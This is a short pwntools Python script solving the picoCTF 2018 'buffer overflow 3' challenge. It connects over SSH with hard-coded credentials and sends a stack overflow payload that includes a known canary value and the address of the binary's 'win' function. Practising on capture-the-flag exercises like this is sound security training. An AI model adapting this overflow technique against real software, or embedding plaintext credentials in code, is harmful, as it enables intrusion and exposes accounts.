#!/usr/bin/env python

from pwn import *


debug = 0

user = 'mitsububunu'
pw = 'v8wQpBt6AQ5mLQQ'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2018shell.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/buffer-overflow-3_1_2e6726e5326a80f8f5a9c350284e6c7f')
  p = s.process('./vuln')

binary = ELF('./vuln')

canary = '4xV,'

print p.recvuntil('>')
p.sendline('300')
print p.recvuntil('>')
p.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + canary + 'AAAABBBBCCCCDDDD' + p32(binary.symbols['win']))
print p.recvall()